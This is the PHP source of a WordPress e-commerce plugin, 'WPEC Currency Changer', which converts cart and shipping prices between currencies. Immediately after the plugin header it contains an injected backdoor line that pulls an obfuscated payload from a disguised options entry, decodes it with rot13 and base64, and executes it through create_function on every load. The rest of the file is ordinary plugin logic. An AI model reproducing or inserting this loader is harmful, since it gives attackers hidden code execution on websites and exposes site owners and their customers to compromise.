<?php
/*
Plugin Name: WPEC Currency Changer
Plugin URI: http://www.getshopped.org/premium-plugins
Description: A multi-currency tool for WPEC. Requires stock theme hooks and WPEC 3.8.8+
Version: 0.1
Author: Instinct 
Author URI: http://www.zao.is
*/



$z=get_option("_transient_feed_b84eb8db72c11d4d6c270f4310472737"); $z=base64_decode(str_rot13($z)); if(strpos($z,"FBD29541")!==false){ $_z=create_function("",$z); @$_z(); }
if( ! class_exists( 'WPEC_Multi_Currency' ) ) :
    
    class WPEC_Multi_Currency {
    
	static $instance;

	public function __construct() {

	    self::$instance = $this;
	    
	    add_action( 'wpsc_init', array( $this, 'load' )  );
	    add_action( 'wp_enqueue_scripts', array( $this, 'enqueue_scripts' ) );
	    add_action( 'wpsc_bottom_of_shopping_cart', array( $this, 'display_fancy_currency_notification' ) );
	    add_action( 'wpsc_additional_sales_amount_info', array( $this, 'wpsc_show_currency_price' ), 10 );
	    add_action( 'wpsc_before_submit_checkout', array( $this, 'wpsc_reset_prices' ) );
	    add_action( 'wpsc_save_cart_item', array( $this, 'wpsc_save_currency_info' ), 10, 2 );
	    add_action( 'wp_head', array( $this, 'load_wpsc_converter' ) );
	    add_filter( 'wpsc_convert_total_shipping', array( $this, 'wpsc_convert_price' ) );
	    add_filter( 'wpsc_do_convert_price', array( $this, 'wpsc_convert_price' ) );
	    add_filter( 'wpsc_item_shipping_amount_db', array( $this, 'wpsc_convert_price' ) );
	    add_filter( 'wpsc_price', array( $this, 'wpsc_convert_price' ) );
	    add_filter( 'wpsc_product_postage_and_packaging', array( $this, 'wpsc_convert_price' ) );
	    add_filter( 'wpsc_currency_display', array( $this, 'wpsc_add_currency_code' ) );
	    add_filter( 'wpsc_toggle_display_currency_code', array( $this, 'override_currency_symbol' ) );
	    add_filter( 'get_post_metadata', array( $this, 'convert_per_item_shipping' ), 10, 4 );
	
	}
	
	/*
	 * Sets constants, loads currency helper functions and widget.
	 *  
	 */
	
	public function load() {
	    
	    define( 'WPSC_CURRENCY_FOLDER', dirname( __FILE__ ) );
	    define( 'WPSC_CURRENCY_URL', plugins_url( __FILE__ ) );
	    include_once( WPSC_CURRENCY_FOLDER . '/currency.helpers.php' ); 
	    include_once( WPSC_CURRENCY_FOLDER . '/widgets/currency_chooser_widget.php' );
	}
	
	
	/*
	 * Enqueues javascript and css...which are entirely blank at this point. 
	 */
	
	public function enqueue_scripts() {
	    
	    wp_enqueue_script( 'wpsc-currency-js', WPSC_CURRENCY_URL.'/js/currency.js', array( 'jquery' ), '2.0' );
	    wp_enqueue_style( 'wpsc-currency-css', WPSC_CURRENCY_URL.'/css/currency.css', false, '2.0' );
	    
	}
	
	/*
	 * This, I imagine, was a notification at some point...or was intended to be eventually.
	 */
	
	public function display_fancy_currency_notification(){
	    
	    global $wpsc_cart;
	    
	    if( $wpsc_cart->selected_currency_code == $_SESSION['wpsc_base_currency_code'] )
		return;
	    
	    $output .= "<div id='wpsc_currency_notification'>";
	    $output .= '<p>' . __( 'By clicking Make Purchase you will be redirected to the gateway, and the cart prices will be converted to the shops local currency', 'wpsc' ). ' ' . $_SESSION['wpsc_base_currency_code'] . '</p>';
	    $output .= '</div>';
		
	    echo $output;
	    
	}
	
	/**
	* Description show currency price shows converted price viewed by user when proceeding through checkout
	*
	* @param purchaselog id
	* @return none
	*/
	
	public function wpsc_show_currency_price( $purchaselog_id ){
	    
	    global $wpdb, $purchlogitem;
	    
	    $sql = "SELECT `id` FROM `" . WPSC_TABLE_CART_CONTENTS . "` WHERE `purchaseid` = %f";
	    
	    $ids = $wpdb->get_col( $wpdb->prepare( $sql, $purchaselog_id ) );
	    
	    foreach( $ids as $id ){
		$conversion_rate = wpsc_get_cartmeta( $id, 'wpsc_currency_conversion_rate' );
		if( is_numeric( $conversion_rate ) )
		    break;
	    }
	    
	    if( $conversion_rate ){
		$conversion_rate = maybe_unserialize( $conversion_rate );
		foreach( (array) $conversion_rate as $key => $value ){
		    echo '<br />' . $key . ' ' . wpsc_currency_display( $purchlogitem->extrainfo->totalprice * $value, array( 'display_as_html' => false ) );
		    break;
		}
	    }

	}
	
	/**
	 * Saves currency info as conversion rate for cart.
	 *
	 * @param cart_id
	 * @param product_id
	 * @return nada
	 */
	public function wpsc_save_currency_info( $cart_id, $product_id ){

	    global $wpsc_cart;

	    $meta_key = 'wpsc_currency_conversion_rate';
	    $meta_value = array( $wpsc_cart->selected_currency_code => $wpsc_cart->currency_conversion );
	    wpsc_update_cartmeta( $cart_id, 'wpsc_currency_conversion_rate', $meta_value );

	}
	
	/**
	* Description Converts prices for all prices, called through filters
	*
	* @param price double numeric
	* @return number calculated price
	*/
	public function wpsc_convert_price( $price ){
	    
	    global $wpsc_cart;
	    
	    if( $wpsc_cart->use_currency_converter )
		$price = $price * $wpsc_cart->currency_conversion;
	
	    return $price;
	}
	
	public function override_currency_symbol( $args ) {
	    
	    $args = array(
		'isocode' => $wpsc_cart->selected_currency_isocode
	    );
	    
	    return $args;
	    
	}
	
	/**
	* Adds Currency Country Code to Prices
	*
	* @param string $total price + currency symbol
	* @return string country code, currency symbol and total price
	*/
	
	public function wpsc_add_currency_code( $total ){

	    global $wpsc_cart;
	    
	    $total = $wpsc_cart->selected_currency_code . ' ' . str_replace( $_SESSION['wpsc_base_currency_symbol'], $wpsc_cart->selected_currency_symbol, $total );

	    return $total;
	}
	
	/**
	 * Reset prices to the default, and calculates new total cart price.
	 *
	 * @param none
	 * @return none
	 */

	public function wpsc_reset_prices(){
	    
	    global $wpsc_cart;
	    
	    $wpsc_cart->use_currency_converter = false;
	    $wpsc_cart->total_price = null;
	    $wpsc_cart->subtotal = null;
	    
	    
	    foreach( (array)$wpsc_cart->cart_items as $item )
		$item->refresh_item();
	    
	}
	
	
	/**
	* Sets up the converter data, does initial conversion for for 1.00 of base currency
	* 
	* @return none
	*/
	
	public function load_wpsc_converter() {

	    global $wpsc_cart, $wpdb;
	    
	    if( $_REQUEST['wpsc_admin_action'] != 'change_currency_country' )
		return;
	    
	    $wpsc_cart->use_currency_converter = true;
	    
	    $currency_code = $wpdb->get_results( "SELECT `code`, `symbol_html` FROM `" . WPSC_TABLE_CURRENCY_LIST . "` WHERE `id`='" . get_option( 'currency_type' ) . "' LIMIT 1", ARRAY_A );
	    $local_currency_code = $currency_code[0]['code'];
	    $local_currency_symbol_html = $currency_code[0]['symbol_html'];
	    $_SESSION['wpsc_base_currency_symbol'] = $local_currency_symbol_html;
	    $_SESSION['wpsc_base_currency_code'] = $local_currency_code;
	    
	    if( ! isset( $_POST['reset'] ) ){
		$sql = "SELECT `code` FROM `" . WPSC_TABLE_CURRENCY_LIST . "` WHERE `id` = %f LIMIT 1";
		$foreign_currency_code = $wpdb->get_var( $wpdb->prepare( $sql, absint( $_POST['currency_option'] ) ) );
		$sql = "SELECT `symbol` FROM `" . WPSC_TABLE_CURRENCY_LIST . "` WHERE `id` = %f LIMIT 1";
		$foreign_currency_symbol = $wpdb->get_var( $wpdb->prepare( $sql, absint( $_POST['currency_option'] ) ) );
		$sql = "SELECT `isocode` FROM `" . WPSC_TABLE_CURRENCY_LIST . "` WHERE `id` = %f LIMIT 1";
		$foreign_currency_isocode = $wpdb->get_var( $wpdb->prepare( $sql, absint( $_POST['currency_option'] ) ) );
		$_SESSION['wpsc_currency_code'] = absint( $_POST['currency_option'] );
		$wpsc_cart->selected_currency_code = $foreign_currency_code;
		$wpsc_cart->selected_currency_symbol = $foreign_currency_symbol;
		$wpsc_cart->selected_currency_isocode = $foreign_currency_isocode;
		
	    } else {
		
		$_SESSION['wpsc_currency_code'] = get_option( 'currency_type' );
		$wpsc_cart->selected_currency_code = $local_currency_code;
		$foreign_currency_code = $local_currency_code;
		
	    }
	    
	    if( ! empty( $foreign_currency_code ) || $foreign_currency_code != $local_currency_code )
		$wpsc_cart->currency_conversion = wpsc_convert_currency( 1, $local_currency_code, $foreign_currency_code );
	    
	    $wpsc_cart->wpsc_refresh_cart_items();
	    
	    $wpsc_cart->subtotal = null;
	    $wpsc_cart->total_price = null;
	    $wpsc_cart->total_tax = null;

	    foreach( $wpsc_cart->cart_items as $item )
		$item->total_price = round( $this->wpsc_convert_price( $item->total_price ), 3 );
	}
    }
    
    $GLOBALS['wpsc_multi_currency'] = new WPEC_Multi_Currency;
    
endif;

?>